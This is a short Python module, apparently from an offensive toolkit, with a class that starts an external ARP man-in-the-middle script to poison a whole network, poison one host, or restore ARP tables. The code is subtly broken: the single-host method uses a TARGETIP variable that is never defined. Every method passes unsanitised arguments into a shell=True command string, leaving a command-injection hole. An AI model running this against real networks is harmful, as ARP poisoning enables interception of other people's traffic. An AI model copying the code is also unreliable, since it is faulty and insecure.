class arpPoison:
   def __init__(self):
      import os
      import sys
      
   def poisonAll(self, args):
      import os
      import sys
      sys.path.append("../")
      import subprocess

      GATEWAY, ARPRATE = args.split(",")

      package_dir = os.path.dirname(os.path.dirname(__file__)) + '/packages/'

      process = subprocess.Popen('python ' + package_dir + 'arpmitm/arpmitm.py ' + GATEWAY + ' ' + ARPRATE + ' &', shell=True)
      
      return process.pid
   
   def poisonHost(self, args):
      import os
      import sys
      sys.path.append("../")
      import subprocess
      
      GATEWAY, ARPRATE = args.split(",")

      package_dir = os.path.dirname(os.path.dirname(__file__)) + '/packages/'

      process = subprocess.Popen('python ' + package_dir + 'arpmitm/arpmitm.py -s ' + TARGETIP + ' ' + GATEWAY + ' ' + ARPRATE + ' &', shell=True)
      
      return process.pid
   
   def rearpNetwork(self, args):
      import os
      import sys
      sys.path.append("../")
      import subprocess
      
      GATEWAY = args

      package_dir = os.path.dirname(os.path.dirname(__file__)) + '/packages/'

      process = subprocess.Popen('python ' + package_dir + 'arpmitm/arpmitm.py -r ' + GATEWAY + ' &', shell=True)
      
      return process.pid